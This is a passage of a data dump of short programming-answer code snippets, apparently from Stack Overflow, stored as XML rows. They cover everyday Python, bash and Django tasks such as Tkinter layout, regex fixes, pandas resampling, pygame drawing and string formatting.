</snippet></ROW><ROW><id>20390082</id><snippet>#!/bin/bash
for f in `find . -type f | grep \.html`
   do
   title=$( awk 'BEGIN{IGNORECASE=1;FS="&lt;title&gt;|&lt;/title&gt;";RS=EOF} {print $2}' "$f" )
   mv -i "$f" "${title//[ ]/-}".html
done
</snippet></ROW><ROW><id>20390107</id><snippet>sudo easy_install -U distribute</snippet></ROW><ROW><id>20390107</id><snippet>sudo</snippet></ROW><ROW><id>20390215</id><snippet>place()</snippet></ROW><ROW><id>20390215</id><snippet>import Tkinter as tk
#or from Tkinter import Canvas, Label, Tk

L1 = [0, 0, 0, 1]
L2 = [1, 0, 1, 2]
L3 = [2, 0, 2, 3]
L4 = [3, 0, 3, 4]
L5 = [4, 0, 4, 5]

top = tk.Tk()
canvas = tk.Canvas(top, width=500, height=500)

offset = 1
scale = 50
count = 1

for L in [L1, L2, L3, L4, L5]:
    canvas.create_line(*[scale*(i + offset) for i in L])
    #create label and place it above line
    lbl = tk.Label(top, text = "%sx"%(count))
    lbl.place(x=scale * count, y=20)
    #add to count manually
    count += 1

canvas.pack()
top.mainloop()
</snippet></ROW><ROW><id>20390219</id><snippet>dict()</snippet></ROW><ROW><id>20390219</id><snippet>def dicts(t): return dict((k, dicts(t[k])) for k in t)
</snippet></ROW><ROW><id>20390245</id><snippet>ax1.set_ylim( -.1, 1.1 )
ax1.set_yticks( np.linspace(0, 1, 10) )

ax1.set_xscale('log')
</snippet></ROW><ROW><id>20390275</id><snippet>session_data</snippet></ROW><ROW><id>20390275</id><snippet>import json</snippet></ROW><ROW><id>20390275</id><snippet>session_data = urllib.urlencode(session_data)
</snippet></ROW><ROW><id>20390275</id><snippet>session_data = json.dumps(session_data)
</snippet></ROW><ROW><id>20390316</id><snippet>.replace()</snippet></ROW><ROW><id>20390316</id><snippet>without_newlines = my_string.replace("\n", "")
</snippet></ROW><ROW><id>20390316</id><snippet>.translate()</snippet></ROW><ROW><id>20390316</id><snippet>.replace()</snippet></ROW><ROW><id>20390856</id><snippet>mongodb-engine</snippet></ROW><ROW><id>20390856</id><snippet>queryset</snippet></ROW><ROW><id>20390856</id><snippet>count = Model.objects.all().count()
</snippet></ROW><ROW><id>20390856</id><snippet>values = Model.objects.values('a', 'b')
</snippet></ROW><ROW><id>20391005</id><snippet>MySpiderObj</snippet></ROW><ROW><id>20391005</id><snippet>self</snippet></ROW><ROW><id>20391031</id><snippet>partition</snippet></ROW><ROW><id>20391031</id><snippet>partition</snippet></ROW><ROW><id>20391031</id><snippet>def splits(s,seps):
    l,_,r = s.partition(seps[0])
    if len(seps) == 1:
        return [l,r]
    return [l] + splits(r,seps[1:])
</snippet></ROW><ROW><id>20391031</id><snippet>a = 'hello^goo^dbye:cat@dog'

splits(a,['^',':','@'])
Out[7]: ['hello', 'goo^dbye', 'cat', 'dog']
</snippet></ROW><ROW><id>20391104</id><snippet>import urllib2, bs4, re

opener = urllib2.build_opener()
opener.addheaders = [("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36")]
# I omitted the cookie here and you need to copy and paste your own
opener.addheaders.append(('Cookie', 'act-bg-i...eat_uuniq=1; criteo=; pl=true'))
soup = bs4.BeautifulSoup(opener.open("http://www.heraldsun.com.au/help/rss"))
div = soup.find('div', {"id":"content-2"}).find('div', {"class":"group-content"})

for a in div.find_all('a'):
    try:
        if 'feeds.news' in a['href']:
            print a 
    except:
        pass
</snippet></ROW><ROW><id>20391104</id><snippet>&lt;a href="http://feeds.news.com.au/heraldsun/rss/heraldsun_news_breakingnews_2800.xml"&gt;Breaking News&lt;/a&gt;
&lt;a href="http://feeds.news.com.au/heraldsun/rss/heraldsun_news_topstories_2803.xml"&gt;Top Stories&lt;/a&gt;
&lt;a href="http://feeds.news.com.au/heraldsun/rss/heraldsun_news_worldnews_2793.xml"&gt;World News&lt;/a&gt;
&lt;a href="http://feeds.news.com.au/heraldsun/rss/heraldsun_news_morenews_2794.xml"&gt;Victoria and National News&lt;/a&gt;
&lt;a href="http://feeds.news.com.au/heraldsun/rss/heraldsun_news_sport_2789.xml"&gt;Sport News&lt;/a&gt;
...
</snippet></ROW><ROW><id>20391136</id><snippet>THREE_CHOICES = 'ABC'
FOUR_CHOICES = 'ABCD'
FIVE_CHOICES = 'ABCDE'

import random

def generate_answers(n):
    '''Generates random answers from number inputted '''
    answerList = ""
    for i in range(0,n):
        answerList += random.choice(FOUR_CHOICES)
    return answerList
</snippet></ROW><ROW><id>20391145</id><snippet>&gt;&gt;&gt; from re import split
&gt;&gt;&gt; lista = ['janu', 'manu', 'tanu', 'banu']
&gt;&gt;&gt; [split("(^[^aeiou]+)(?=[aeiouy])", x)[1]+"doc" for x in lista]
['jdoc', 'mdoc', 'tdoc', 'bdoc']
&gt;&gt;&gt;
</snippet></ROW><ROW><id>20391145</id><snippet>&gt;&gt;&gt; from re import split
&gt;&gt;&gt; lista = ['janu', 'manu', 'tanu', 'banu']
&gt;&gt;&gt; listb = []
&gt;&gt;&gt; for item in lista:
...     data = split("(^[^aeiou]+)(?=[aeiouy])", item)
...     listb.append(data[2]+data[1]+"doc")
...
&gt;&gt;&gt; listb
['anujdoc', 'anumdoc', 'anutdoc', 'anubdoc']
&gt;&gt;&gt;
</snippet></ROW><ROW><id>20391149</id><snippet>mask = freq&gt;=0
pl.plot(freq[mask]*2*np.pi, np.sqrt(sp[mask].real**2+sp[mask].imag**2))
pl.plot(freq[~mask]*2*np.pi, np.sqrt(sp[~mask].real**2+sp[~mask].imag**2))
</snippet></ROW><ROW><id>20391215</id><snippet>qlist = [(q1, "8"), (q2, "B"), (q3, "1"), (q4, "C"), (q5, "D"), 
         (q6, "A"), (q7, "C"), (q8, "B"), (q9, "B"), (q10, "D")]
</snippet></ROW><ROW><id>20391215</id><snippet>for q, a in qlist:
    # q is the question, a is the correct answer
</snippet></ROW><ROW><id>20391215</id><snippet>for n, q in enumerate(qlist):
    a = alist[n]    # gets the correct answer for current question
</snippet></ROW><ROW><id>20391215</id><snippet>q</snippet></ROW><ROW><id>20391253</id><snippet>def calc(self):
    global var1, var2

    selected_index = teams.index(var1.get())

    PowerRank = power_rankings[ selected_index ]
    WinPerc = winning_percentage[ selected_index ] * 100
    Luck = random.randrange(0,50)
    HomeBonus = 10

    # ...
</snippet></ROW><ROW><id>20391253</id><snippet>teams</snippet></ROW><ROW><id>20391253</id><snippet>power_rankings</snippet></ROW><ROW><id>20391253</id><snippet>winning_percentage</snippet></ROW><ROW><id>20391253</id><snippet>var2</snippet></ROW><ROW><id>20391253</id><snippet>global var1, var2</snippet></ROW><ROW><id>20391253</id><snippet>self.var1</snippet></ROW><ROW><id>20391253</id><snippet>self.var2</snippet></ROW><ROW><id>20391253</id><snippet>self.var1</snippet></ROW><ROW><id>20391253</id><snippet>self.var2</snippet></ROW><ROW><id>20391293</id><snippet>&gt;&gt;&gt; from collections import defaultdict
&gt;&gt;&gt; list1 = [('id1','host1'),('id2','host2'),('id1','host5'),('id3','host4'),('id4','host6'),('id5','host8')]
&gt;&gt;&gt; list2 = [('id1','IP1'),('id2','IP2'),('id3','IP3'),('id4','IP4'),('id5','IP5')]
&gt;&gt;&gt; d1 = defaultdict(list)
&gt;&gt;&gt; for k,v in list1:
...     d1[k].append(v)
... 
</snippet></ROW><ROW><id>20391293</id><snippet>&gt;&gt;&gt; for k, s in list2:
...     print s, d1[k]
... 
IP1 ['host1', 'host5']
IP2 ['host2']
IP3 ['host4']
IP4 ['host6']
IP5 ['host8']
</snippet></ROW><ROW><id>20391293</id><snippet>&gt;&gt;&gt; res = [(s, d1[k]) for k, s in list2]
&gt;&gt;&gt; res
[('IP1', ['host1', 'host5']), ('IP2', ['host2']), ('IP3', ['host4']), ('IP4', ['host6']), ('IP5', ['host8'])]
</snippet></ROW><ROW><id>20391332</id><snippet>mylist = [["a",1],["c",1],["a",1]]
newlist = [["null",0]]

mydict = {}
for i in mylist+newlist:
    if i[0] in mydict:
        mydict[i[0]]+=i[1]
    elif i[0] != 'null':
        mydict[i[0]]=i[1]

print [[x,mydict[x]] for x in mydict]

[['a', 2], ['c', 1]]
</snippet></ROW><ROW><id>20391343</id><snippet>restart = 'shutdown -r -t %d' % time
</snippet></ROW><ROW><id>20391405</id><snippet>score = map(int, score)
</snippet></ROW><ROW><id>20391405</id><snippet>print(str(i)+": "+str(score.count(str(i))))
</snippet></ROW><ROW><id>20391611</id><snippet>sizer = wx.BoxSizer(wx.VERTICAL)
st = wx.TextCtrl(self, -1, style = wx.TE_MULTILINE | wx.TE_READONLY, size = (500, 174))
st.SetValue(content)
self.SetSize((500, 174))
sizer.Add(st, 0, wx.EXPAND)
self.SetSizer(sizer)
self.Layout()
self.Show(True)
</snippet></ROW><ROW><id>20391616</id><snippet>itertools.product</snippet></ROW><ROW><id>20391616</id><snippet>repeat</snippet></ROW><ROW><id>20391616</id><snippet>In [92]: from itertools import product

In [93]: word = "L0B7B0B5"

In [94]: subs = product("68", repeat=word.count("B"))

In [95]: list(subs)
Out[95]: 
[('6', '6', '6'),
 ('6', '6', '8'),
 ('6', '8', '6'),
 ('6', '8', '8'),
 ('8', '6', '6'),
 ('8', '6', '8'),
 ('8', '8', '6'),
 ('8', '8', '8')]
</snippet></ROW><ROW><id>20391616</id><snippet>replace</snippet></ROW><ROW><id>20391616</id><snippet>In [97]: subs = product("68", repeat=word.count("B"))

In [98]: [reduce(lambda s, c: s.replace('B', c, 1), sub, word) for sub in subs]
Out[98]: 
['L0676065',
 'L0676085',
 'L0678065',
 'L0678085',
 'L0876065',
 'L0876085',
 'L0878065',
 'L0878085']
</snippet></ROW><ROW><id>20391616</id><snippet>itertools</snippet></ROW><ROW><id>20391616</id><snippet>In [90]: from itertools import chain, izip_longest

In [91]: subs = product("68", repeat=word.count("B"))

In [92]: [''.join(chain(*izip_longest(word.split('B'), sub, fillvalue=''))) for sub in subs]
Out[92]: 
['L0676065',
 'L0676085',
 'L0678065',
 'L0678085',
 'L0876065',
 'L0876085',
 'L0878065',
 'L0878085']
</snippet></ROW><ROW><id>20391703</id><snippet>cls.query(ancestor=version_key()).filter(topic=topic).order(-cls.created)
</snippet></ROW><ROW><id>20392161</id><snippet># Response to StackOverflow post:
# Making a hollow box in Python

# The multiplication operator (*) is the same as repeated
# concatenation when applied to strings in Python.

# I solved the problem by creating an array with N elements
# and gluing them together (str.join(array)) with newline
# characters.

# I trust you're already familiar with string formatting and
# concatenation, but in case you're not, please feel free to
# ask for clarification.


def main():
    n = int (input("Enter a positive integer between 1 and 15"))
    box = "\n".join(["*"*(2*n)] + ["*%s*" % (" "*(2*n-2))]*(n-2) + ["*"*(int(n&gt;1)*2*n)])
    print (box)


if __name__ == '__main__':
    main()
    input() # Prevents the console from closing immediately
</snippet></ROW><ROW><id>20392267</id><snippet>ve/bin/activate</snippet></ROW><ROW><id>20392267</id><snippet>bin/activate</snippet></ROW><ROW><id>20392267</id><snippet>source</snippet></ROW><ROW><id>20392267</id><snippet>bin/activate</snippet></ROW><ROW><id>20392267</id><snippet>ve() { source $1/bin/activate; }
</snippet></ROW><ROW><id>20392267</id><snippet>ve foo</snippet></ROW><ROW><id>20392267</id><snippet>foo</snippet></ROW><ROW><id>20392317</id><snippet>pandas.Series.resample()</snippet></ROW><ROW><id>20392317</id><snippet>&gt;&gt;&gt; x.resample('D').fillna(0)
2013-11-01    1
2013-11-02    2
2013-11-03    0
2013-11-04    4
</snippet></ROW><ROW><id>20392317</id><snippet>fill_method</snippet></ROW><ROW><id>20392317</id><snippet>resample()</snippet></ROW><ROW><id>20392317</id><snippet>NaN</snippet></ROW><ROW><id>20392317</id><snippet>how</snippet></ROW><ROW><id>20392317</id><snippet>&gt;&gt;&gt; x.resample('D', how=lambda x: x.mean() if len(x) &gt; 0 else 0)
2013-11-01    1
2013-11-02    2
2013-11-03    0
2013-11-04    4
</snippet></ROW><ROW><id>20392317</id><snippet>reindex()</snippet></ROW><ROW><id>20392317</id><snippet>fill_value=0</snippet></ROW><ROW><id>20392756</id><snippet>lambda</snippet></ROW><ROW><id>20392756</id><snippet>    for item in testItems:
        action = self.popMenu.addAction('Selected %s' % item)
        action.triggered[()].connect(
            lambda item=item: self.printItem(item))
</snippet></ROW><ROW><id>20392756</id><snippet>lambda</snippet></ROW><ROW><id>20392756</id><snippet>triggered</snippet></ROW><ROW><id>20392756</id><snippet>triggered</snippet></ROW><ROW><id>20392756</id><snippet>item</snippet></ROW><ROW><id>20392756</id><snippet>lambda</snippet></ROW><ROW><id>20392926</id><snippet>sphinx.ext.autosummary</snippet></ROW><ROW><id>20392926</id><snippet>extensions</snippet></ROW><ROW><id>20392926</id><snippet>extensions = ['sphinx.ext.autosummary', ...]
</snippet></ROW><ROW><id>20393023</id><snippet>izip_longest</snippet></ROW><ROW><id>20393023</id><snippet>def csvContainer(col1, col2, col3, col4=(), col5=()):
    container = [
        [x for x in items if x is not None] for items in 
        itt.izip_longest(col1, col2, col3, col4, col5)
        ]
</snippet></ROW><ROW><id>20393023</id><snippet>[1, 2, 3]</snippet></ROW><ROW><id>20393023</id><snippet>[1, 2, 3, None, None]</snippet></ROW><ROW><id>20393023</id><snippet>def csvContainer(*cols):
    container = [
        [x for x in items if x is not None] for items in 
        itt.izip_longest(*cols)
        ]
</snippet></ROW><ROW><id>20393087</id><snippet>((df['x'] * df['y']).sum() - df['x'].sum() * df['y'].mean()) ** 2
</snippet></ROW><ROW><id>20393108</id><snippet>((.|\s)*)
</snippet></ROW><ROW><id>20393108</id><snippet>"this is the code\nthis is more\n"</snippet></ROW><ROW><id>20393108</id><snippet>\n</snippet></ROW><ROW><id>20393108</id><snippet>((?:.|\s)*)
</snippet></ROW><ROW><id>20393108</id><snippet>([\s\S]*)</snippet></ROW><ROW><id>20393108</id><snippet>([\s\S]*?)</snippet></ROW><ROW><id>20393209</id><snippet>di_users</snippet></ROW><ROW><id>20393209</id><snippet>di_users = dict.fromkeys(xrange(25), [])
</snippet></ROW><ROW><id>20393209</id><snippet>&gt;&gt;&gt; d = dict.fromkeys(xrange(4), [])
&gt;&gt;&gt; d[0].append(1)
&gt;&gt;&gt; d
{0: [1], 1: [1], 2: [1], 3: [1]}
</snippet></ROW><ROW><id>20393209</id><snippet>d[0]</snippet></ROW><ROW><id>20393209</id><snippet>d[1]</snippet></ROW><ROW><id>20393209</id><snippet>d[2]</snippet></ROW><ROW><id>20393209</id><snippet>&gt;&gt;&gt; d[0] is d[1] is d[2] is d[3]
True
</snippet></ROW><ROW><id>20393209</id><snippet>d[0]</snippet></ROW><ROW><id>20393209</id><snippet>d[1]</snippet></ROW><ROW><id>20393209</id><snippet>lst = []
di_users = {}
for i in xrange(25):
    di_users[i] = lst
</snippet></ROW><ROW><id>20393209</id><snippet>di_users</snippet></ROW><ROW><id>20393209</id><snippet>collections.defaultdict</snippet></ROW><ROW><id>20393209</id><snippet>di_users = collections.defaultdict(list)
</snippet></ROW><ROW><id>20393209</id><snippet>di_users = {k: [] for k in xrange(25)}  # python2.7
</snippet></ROW><ROW><id>20393209</id><snippet>di_users = dict((k,[]) for k in xrange(25))
</snippet></ROW><ROW><id>20393256</id><snippet>from django.db import IntegrityError

class MyTemporaryObject(models.Model):
    auto_pseudoid = models.CharField(max_length=16, blank=True, editable=False, unique=True)
    # add index=True if you plan to look objects up by it
    # blank=True is so you can validate objects before saving - the save method will ensure that it gets a value

    # other fields as desired

    def save(self, *args, **kwargs):
        if not self.auto_pseudoid:
            self.auto_pseudoid = generate_random_alphanumeric(16)
            # using your function as above or anything else
        success = False
        failures = 0
        while not success:
            try:
                super(MyTemporaryObject, self).save(*args, **kwargs)
            except IntegrityError:
                 failures += 1
                 if failures &gt; 5: # or some other arbitrary cutoff point at which things are clearly wrong
                     raise
                 else:
                     # looks like a collision, try another random value
                     self.auto_pseudoid = generate_random_alphanumeric(16)
            else:
                 success = True
</snippet></ROW><ROW><id>20393256</id><snippet>save</snippet></ROW><ROW><id>20393485</id><snippet>r'(P&lt;post_type&gt;[article|review|blog|news|video])'
</snippet></ROW><ROW><id>20393485</id><snippet>r'(?P&lt;post_type&gt;article|review|blog|news|video)'
</snippet></ROW><ROW><id>20393485</id><snippet>r'^(P&lt;year&gt;\d{4})/(P&lt;month&gt;\d{2})/(P&lt;day&gt;\d{2})/(P&lt;slug&gt;\w+)/(P&lt;post_id&gt;\d+)$
</snippet></ROW><ROW><id>20393485</id><snippet>r'^(?P&lt;year&gt;\d{4})/(?P&lt;month&gt;\d{2})/(?P&lt;day&gt;\d{2})/(?P&lt;slug&gt;\w+)/(?P&lt;post_id&gt;\d+)$
</snippet></ROW><ROW><id>20393559</id><snippet>--traceback</snippet></ROW><ROW><id>20393687</id><snippet>from subprocess import Popen, PIPE
# Set up the process
p = Popen("yourprogram", stdout=PIPE, close_fds=True)
count = 0
while True:
    count += 1
    print '%s: %s' % (count, p.stdout.readline().strip())
</snippet></ROW><ROW><id>20393687</id><snippet>yourprogram</snippet></ROW><ROW><id>20393687</id><snippet>#!/bin/sh
while sleep 1s
do
    date
done
</snippet></ROW><ROW><id>20393687</id><snippet>$ python test.py
1: Thu Dec  5 23:31:45 PST 2013
2: Thu Dec  5 23:31:46 PST 2013
3: Thu Dec  5 23:31:47 PST 2013
4: Thu Dec  5 23:31:48 PST 2013
5: Thu Dec  5 23:31:49 PST 2013
6: Thu Dec  5 23:31:50 PST 2013
7: Thu Dec  5 23:31:51 PST 2013
</snippet></ROW><ROW><id>20393859</id><snippet>import matplotlib.pyplot as plt
import numpy as np

fig = plt.figure()
ax = fig.add_subplot(111)
x = np.linspace(0, 2*np.pi, 100)
y = np.sin(x)
ax.plot(x,y)
ax.set_yticklabels([str(abs(x)) for x in ax.get_yticks()])
ax.show()
</snippet></ROW><ROW><id>20393859</id><snippet>ax.set_ylim</snippet></ROW><ROW><id>20394202</id><snippet>from pygame.locals import *
import pygame
import os
import sys


pygame.init()

CAPTION = "TEST"

class Game():
    def __init__(self):
        #window setup
        pygame.display.set_caption(CAPTION)
        os.environ["SDL_VIDEO_CENTERED"] = "True"
        self.fps = 60.0

        self.clock = pygame.time.Clock()
        self.last_tick = pygame.time.get_ticks()
        self.screen_res = [200, 200]

        self.screen = pygame.display.set_mode(self.screen_res,pygame.HWSURFACE)

        self.rect = pygame.Surface((100, 100))
        self.rect.fill((250, 0,0))

        self.alpha = 1
        self.a_change = True
        #Tweak this to change speed
        self.blink_spd = 0.1

        #start loop
        self.clock.tick(self.fps)
        while 1:
            self.Loop()

    def Loop(self):
        # main game loop
        self.eventLoop()

        self.last_tick = pygame.time.get_ticks()

        self.screen.fill((0,0,0))
        #Check if alpha is going up
        if self.a_change:
            self.alpha += self.blink_spd
            if self.alpha &gt;= 175:#if all the way up go down
                self.a_change = False
        #Check if alpha is going down        
        elif self.a_change == False:
            self.alpha += -self.blink_spd
            if self.alpha &lt;= 30: #if all the way down go up
                self.a_change = True

        self.rect.set_alpha(self.alpha)
        self.screen.blit(self.rect,(50,50))

        pygame.display.update()


    def eventLoop(self):
        # the main event loop, detects keypresses
        for event in pygame.event.get():
            if event.type == QUIT:
                pygame.quit()
                sys.exit()

Game()
</snippet></ROW><ROW><id>20394202</id><snippet>pygame.Surface.set_alpha()</snippet></ROW><ROW><id>20394336</id><snippet>from lxml import html</snippet></ROW><ROW><id>20394336</id><snippet>from bs4 import UnicodeDammit</snippet></ROW><ROW><id>20394336</id><snippet>doc = UnicodeDammit(text1, is_html=False)</snippet></ROW><ROW><id>20394336</id><snippet>parser = html.HTMLParser(encoding=doc.original_encoding)</snippet></ROW><ROW><id>20394336</id><snippet>root = html.document_fromstring(text1, parser=parser)</snippet></ROW><ROW><id>20394336</id><snippet>table = root.find('.//table')</snippet></ROW><ROW><id>20394336</id><snippet>from bs4 import BeautifulSoup</snippet></ROW><ROW><id>20394336</id><snippet>BeautifulSoup(text1, 'xml')</snippet></ROW><ROW><id>20394336</id><snippet>BeautifulSoup(text1, ['lxml','xml'])</snippet></ROW><ROW><id>20394454</id><snippet>Align</snippet></ROW><ROW><id>20394454</id><snippet>onclick="UniProt.analytics('AlignmentSubmissionPage', 'click', 'Submit align'); submitAlignForm();"
</snippet></ROW><ROW><id>20394454</id><snippet>UniProt.analytics()</snippet></ROW><ROW><id>20394454</id><snippet>submitAlignForm()</snippet></ROW><ROW><id>20394454</id><snippet>js-compr.js2013_11</snippet></ROW><ROW><id>20394478</id><snippet>outputStream = StringIO.StringIO()
output.write(outputStream) #write merged output to the StringIO object

fname = 'filename'
self.response.headers['Content-Disposition'] = 'attachment; filename=' + fname + '.pdf'
self.response.write(outputStream.getvalue())
</snippet></ROW><ROW><id>20394554</id><snippet>tis_class</snippet></ROW><ROW><id>20394612</id><snippet>list</snippet></ROW><ROW><id>20394612</id><snippet>with open('youFile.txt','r') as fp:
    linesList = fp.readlines()
    # get the first
    first = linesList[0]
    # get the last
    last = linesList[-1]
</snippet></ROW><ROW><id>20394775</id><snippet>XMLRenderer</snippet></ROW><ROW><id>20394775</id><snippet>REST_FRAMEWORK = {
  'DEFAULT_RENDERER_CLASSES': (
    'rest_framework.renderers.XMLRenderer',
    'rest_framework.renderers.JSONRenderer',
    'rest_framework.renderers.BrowsableAPIRenderer',
  )
}
</snippet></ROW><ROW><id>20394775</id><snippet>render_classes</snippet></ROW><ROW><id>20394775</id><snippet>xml</snippet></ROW><ROW><id>20394870</id><snippet>enctype</snippet></ROW><ROW><id>20394870</id><snippet>&lt;form action="{% url 'changeprofile' %}" method="post" enctype="multipart/form-data"&gt;
</snippet></ROW><ROW><id>20394870</id><snippet>request.FILES</snippet></ROW><ROW><id>20395049</id><snippet>05/12/2013.png</snippet></ROW><ROW><id>20395049</id><snippet>/</snippet></ROW><ROW><id>20395049</id><snippet>2013.png</snippet></ROW><ROW><id>20395049</id><snippet>12</snippet></ROW><ROW><id>20395049</id><snippet>05</snippet></ROW><ROW><id>20395049</id><snippet>time.strftime("%Y-%m-%d")</snippet></ROW><ROW><id>20395075</id><snippet>xml.sax.parse(source, handler)</snippet></ROW><ROW><id>20395075</id><snippet>xml_parser</snippet></ROW><ROW><id>20395075</id><snippet>xml_parser.parse(source)
</snippet></ROW><ROW><id>20395227</id><snippet>(?&lt;=\d)[a-zA-Z]+(?=\d)</snippet></ROW><ROW><id>20395227</id><snippet>abc234def678hij</snippet></ROW><ROW><id>20395227</id><snippet>def</snippet></ROW><ROW><id>20395227</id><snippet>[a-zA-Z0-9]+</snippet></ROW><ROW><id>20395322</id><snippet>with</snippet></ROW><ROW><id>20395322</id><snippet>class FileList(list):
    def __init__(self, files, mode='r'):
        list.__init__(open(arg, mode) for arg in files)
    def __enter__(self):
        return self
    def __exit__(self, *args):
        for fobj in self:
            fobj.close()

with FileList(["ACCELEROMETER", "GPS", ...], mode='w') as fl:
    for fobj in fl:
        ...
</snippet></ROW><ROW><id>20395587</id><snippet>var channelName = "my-channel"
var channel = pusher.subscribe(channelName);
</snippet></ROW><ROW><id>20395587</id><snippet>push = pusher.Pusher(app_id='your-pusher-app-id', key='your-pusher-key', secret='your-pusher-secret')
push['my-channel'].trigger('dom-change-event', {'data': 'data'})
</snippet></ROW><ROW><id>20395587</id><snippet>channel.bind("dom-change-event", function(data){ // the data you Pushed from backed
  $(".div-to-change").hide(); // with the help of jQuery select the dom, and hide it.
})
</snippet></ROW><ROW><id>20395751</id><snippet># Use add_axes or add_subplot.
ax = fig.add_axes([0.01, 0.01, 0.98, 0.98],
                   projection=ccrs.InterruptedGoodeHomolosine())

# ax = fig.add_subplot(1, 1, 1, projection=ccrs.InterruptedGoodeHomolosine())

ax.set_global()
ax.stock_img()
ax.coastlines()
</snippet></ROW><ROW><id>20395751</id><snippet>from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
from matplotlib.figure import Figure

import cartopy.crs as ccrs

import sys
import Tkinter as Tk

root = Tk.Tk()
root.wm_title("Cartopy in TK")


fig = Figure(figsize=(8,4), dpi=100)

ax = fig.add_axes([0.01, 0.01, 0.98, 0.98], 
                   projection=ccrs.InterruptedGoodeHomolosine())
ax.set_global()
ax.stock_img()
ax.coastlines()

ax.set_title('Cartopy and Tkinter')

# a tk.DrawingArea
canvas = FigureCanvasTkAgg(fig, master=root)
canvas.show()
canvas.get_tk_widget().pack(side=Tk.TOP, fill=Tk.BOTH, expand=1)

canvas._tkcanvas.pack(side=Tk.TOP, fill=Tk.BOTH, expand=1)

button = Tk.Button(master=root, text='Quit', command=sys.exit)
button.pack(side=Tk.BOTTOM)

Tk.mainloop()
</snippet></ROW><ROW><id>20395817</id><snippet>axes</snippet></ROW><ROW><id>20395817</id><snippet>DataFrame</snippet></ROW><ROW><id>20395817</id><snippet>import pandas as pd

df = pd.DataFrame({'contribution': [0.188137,0.160208,0.160208,0.151654,0.149489,0.135975,0.063206]}
                  ,index=['A','B','C','D','E','F','G'])

colors = ['b', 'green', 'y', 'pink','orange','cyan','darkgrey']

ax = df.plot(kind='barh', color=colors, legend=False)

for bar in ax.patches:
    bar.set_facecolor('#888888')

highlight = 'D'
pos = df.index.get_loc(highlight)

ax.patches[pos].set_facecolor('#aa3333')
ax.legend()
</snippet></ROW><ROW><id>20395970</id><snippet>Activity.objects.filter(list__topic__user=my_user)
</snippet></ROW><ROW><id>20395970</id><snippet>Activity.objects.filter(list__topic=my_topic)
</snippet></ROW><ROW><id>20396205</id><snippet>&gt;&gt;&gt; s = 'hello, {person}'
&gt;&gt;&gt; s
'hello, {person}'
&gt;&gt;&gt; s.format(person='james')
'hello, james'                    # your format works
&gt;&gt;&gt; print s                       # but you did not assign it
hello, {person}                   # original `s`
&gt;&gt;&gt; x = s.format(person='james')  # now assign it
&gt;&gt;&gt; print x 
hello, james                      # works!
</snippet></ROW><ROW><id>20396811</id><snippet>1.8</snippet></ROW><ROW><id>20396811</id><snippet>np.linalg.solve(A_list, B_list)
</snippet></ROW><ROW><id>20396811</id><snippet>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; np.random.seed(11)
&gt;&gt;&gt; k = 10
&gt;&gt;&gt; A_list = np.random.rand(k,2,2)
&gt;&gt;&gt; B_list = np.random.rand(k,2)
&gt;&gt;&gt; solution = np.linalg.solve(A_list,B_list)
&gt;&gt;&gt; all(np.allclose(np.dot(A_list[i, :], solution[i,:]), B_list[i, :])
...         for i in range(A_list.shape[0]))
True
</snippet></ROW><ROW><id>20396811</id><snippet>scipy.linalg.block_diag</snippet></ROW><ROW><id>20396811</id><snippet>zip</snippet></ROW><ROW><id>20396811</id><snippet>import scipy.linalg
A = scipy.linalg.block_diag(*A_list)
B = B_list.reshape(-1)
solution = np.linalg.solve(A,B)
solution.reshape(-1,2)
</snippet></ROW><ROW><id>20396811</id><snippet>k=2000; seed=11</snippet></ROW><ROW><id>20396811</id><snippet>&gt;&gt;&gt; timeit('from __main__ import np, A_list, B_list; np.linalg.solve(A_list, B_list)', number = 100)
0.2786309433182055

&gt;&gt;&gt; timeit('from __main__ import np, A_list, B_list; np.array([np.linalg.solve(A,B) for A, B in zip(A_list, B_list)])', number = 100)
8.431871369126554

&gt;&gt;&gt; timeit('from __main__ import np, A, B; np.linalg.solve(A,B)', number = 100)
43.4851636171674712
</snippet></ROW><ROW><id>20396842</id><snippet>WARNING</snippet></ROW><ROW><id>20396842</id><snippet>logger.setLevel(logging.DEBUG)</snippet></ROW><ROW><id>20396842</id><snippet>NullHandler</snippet></ROW><ROW><id>20396876</id><snippet>import numpy as np
#import time
#import matplotlib.pyplot as plt
import scipy.io as c
import pylab as pl                     #added 

datafile = c.loadmat('data.mat') # loading data
img = datafile['img'] # extracting the (351:467:300) array 
imgShape = np.shape(img) 
pl.ion()                               #added 
for i in range(imgShape(2)):           #no need for 0
    pl.cla()                           #added
    pl.imshow(img[:,:,i])
#    time.sleep(0.3) 
    pl.draw()
    pl.pause(0.3)                      #added   
pl.ioff()                              #added
print('Done!')
</snippet></ROW><ROW><id>20397017</id><snippet>while i&lt;=len(s)//2 and s[i] == s[len(s)-i] 
</snippet></ROW><ROW><id>20397017</id><snippet>while 0&lt;=len(s)//2 and s[0] == s[len(s)]
</snippet></ROW><ROW><id>20397017</id><snippet>len(s)</snippet></ROW><ROW><id>20397017</id><snippet>while i&lt;len(s)//2 and s[0] == s[len(s)-i-1]:
</snippet></ROW><ROW><id>20397017</id><snippet>if s == s[::-1]:
    return True
return False
</snippet></ROW><ROW><id>20397017</id><snippet>:</snippet></ROW><ROW><id>20397017</id><snippet>:</snippet></ROW><ROW><id>20397017</id><snippet>::</snippet></ROW><ROW><id>20397545</id><snippet>response = HttpResponse(mimetype='text/csv')
response['Content-Disposition'] = 'attachment; filename=unruly.csv'
writer = csv.writer(response)
</snippet></ROW><ROW><id>20397600</id><snippet>first = lambda s: next((x for x in s if x), None)
</snippet></ROW><ROW><id>20397600</id><snippet>first([None, None,1, 2,None]) # 1
</snippet></ROW><ROW><id>20397678</id><snippet>return tuple(ar)
</snippet></ROW><ROW><id>20397678</id><snippet>return ar
</snippet></ROW><ROW><id>20397917</id><snippet>&gt;&gt;&gt; a = ['bd09fdf7-918e-4a5e-8338-0f6fe78fd238']
&gt;&gt;&gt; b = ['bd09fdf7-918e-4a5e-8338-0f6fe78fd238', '3c26f383-da50-446c-8613-64e1068bd57e']
&gt;&gt;&gt; list(set(b) - set(a))
['3c26f383-da50-446c-8613-64e1068bd57e']
</snippet></ROW><ROW><id>20398209</id><snippet>print "Hello {} %".format(a)
</snippet></ROW><ROW><id>20398209</id><snippet>%</snippet></ROW><ROW><id>20398209</id><snippet>%</snippet></ROW><ROW><id>20398209</id><snippet>print "Hello %d %%" % a
